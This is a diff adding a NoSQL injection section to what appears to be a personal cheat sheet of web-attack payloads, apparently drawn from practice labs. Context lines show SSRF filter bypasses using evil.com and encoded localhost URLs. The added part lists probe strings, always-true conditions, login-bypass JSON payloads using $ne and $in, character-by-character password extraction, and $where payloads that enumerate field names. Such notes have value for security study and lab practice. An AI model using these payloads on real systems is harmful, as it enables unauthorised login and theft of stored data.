@@ -299,3 +299,47 @@ Url encode once/twice
 >http://%65vil.com
 
 Compilance: use http:/evil@original.com/admin/delete - bypass. Then http:/evil#@original.com/admin/delete - not bypass. Then url encode '#' and get >http://localhost%23@stock.weliketoshop.net/admin/delete
+
+# NoSQL injection.
+Tests:
+```
+'"`{
+;$Foo}
+$Foo \xYZ
+```
+
+Get all categories
+>this.category == 'fizzy'||'1'=='1
+
+Operators
+```
+$where - Matches documents that satisfy a JavaScript expression.
+$ne - Matches all values that are not equal to a specified value.
+$in - Matches all of the values specified in an array.
+$regex - Selects documents where values match a specified regular expression.
+```
+
+Login bypass
+```
+{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
+
+{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
+```
+
+Get data
+Password
+```
+admin' && this.password.match(/\d/) || 'a'=='b
+
+admin' && this.password[0] === 'r
+```
+Object fields
+Test for vuln
+```
+{"username":"wiener","password":"peter", "$where":"0"}
+{"username":"wiener","password":"peter", "$where":"1"}
+```
+Get fields name
+```
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
